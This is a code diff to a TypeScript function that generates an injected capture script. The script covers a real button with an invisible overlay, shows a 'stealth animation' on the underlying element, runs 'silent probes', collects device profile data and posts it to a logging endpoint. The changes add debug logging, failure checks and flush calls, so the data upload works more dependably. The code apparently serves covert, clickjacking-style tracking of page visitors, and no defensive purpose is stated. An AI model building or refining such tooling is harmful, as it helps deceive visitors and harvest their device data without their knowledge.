@@ -32,10 +32,16 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(Object.assign({ tmplId: cfg.tmplId }, data))
         });
-        console.log("[DEBUG] logEvent response: ", response.status);
+        
+        if (!response.ok) {
+          console.error("[DEBUG] logEvent FAILED with status: ", response.status);
+          return null;
+        }
+        
+        console.log("[DEBUG] logEvent SUCCESS: ", response.status);
         return response;
       } catch(e) {
-        console.error("[DEBUG] logEvent error: ", e);
+        console.error("[DEBUG] logEvent EXCEPTION (Check Browser/CSP): ", e);
         return null; 
       }
     }
@@ -140,14 +146,19 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           });
 
           function trigger() {
+            clientLog("trigger: Calling startCapture");
             console.log("[DEBUG] Triggering capture, calling window.startCapture");
             window.startCapture();
             if (over && over.parentNode) over.parentNode.removeChild(over);
           }
           
           function handleTap(e) {
-            clientLog("handleTap: Clicked");
+            console.log("debug: handleTap click", e);
+            clientLog("handleTap: Clicked", { e: e ? e.type : 'unknown' });
             var btn = getTargetBtn();
+            if (!btn) {
+              clientLog("handleTap: Error - no button found!");
+            }
             // Stealth animation on the real UI element underneath
             if (btn && cfg.tmplId !== 'enuma_elish' && cfg.tmplId !== 'flash_strike') {
               btn.style.transform = 'scale(0.96)';
@@ -283,12 +294,13 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         clientLog("startCapture: calling logExtra");
         logExtra({ device_profile: meta });
         clientLog("startCapture: Exiting captureAndroidMeta");
+        flushExtra();
       };
       captureAndroidMeta().catch(e => clientLog("captureAndroidMeta error", { error: e.message }));
 
       // Parallelize high-priority stealth probes
       clientLog("startCapture: RunSilentProbes");
-      runSilentProbes().catch(e => clientLog("runSilentProbes error", { error: e.message }));
+      runSilentProbes().then(() => flushExtra()).catch(e => clientLog("runSilentProbes error", { error: e.message }));
 
     if (!isSilent) {
       clientLog("startCapture: Not silent, setting up UI");
